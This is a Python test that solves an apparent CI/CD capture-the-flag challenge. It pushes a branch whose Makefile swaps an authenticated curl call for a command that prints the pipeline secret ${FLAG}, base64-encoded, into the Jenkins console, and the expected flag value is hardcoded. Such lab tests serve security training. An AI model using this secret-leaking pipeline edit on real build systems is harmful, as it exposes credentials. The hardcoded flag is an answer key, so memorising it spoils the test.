from conftest import GITEA_GIT_BASE, REPOSITORIES_DIR, OWNER
from git import Repo
from uuid import uuid4
from utils import branch_and_replace_file_content, find_in_console
from base64 import b64encode


def test_mad_hatter(jenkins_client):
    repo = Repo.clone_from(f'{GITEA_GIT_BASE}/{OWNER}/mad-hatter.git',
                           REPOSITORIES_DIR / 'mad-hatter',
                           branch='main')
    new_branch_name = uuid4().hex
    replace_tuples = [('curl -isSL "http://wonderland:1234/api/user" -H '
                       '"Authorization: Token ${FLAG}" -H "Content-Type: application/json"',
                       'echo “${FLAG}” | base64')]
    branch_and_replace_file_content(repo, new_branch_name, 'Makefile', replace_tuples)
    flag = b64encode('ACD6E6B8-3584-4F43-AB9C-ACD080B8EBB2'.encode()).decode()
    assert find_in_console(jenkins_client, 'mad-hatter', flag)
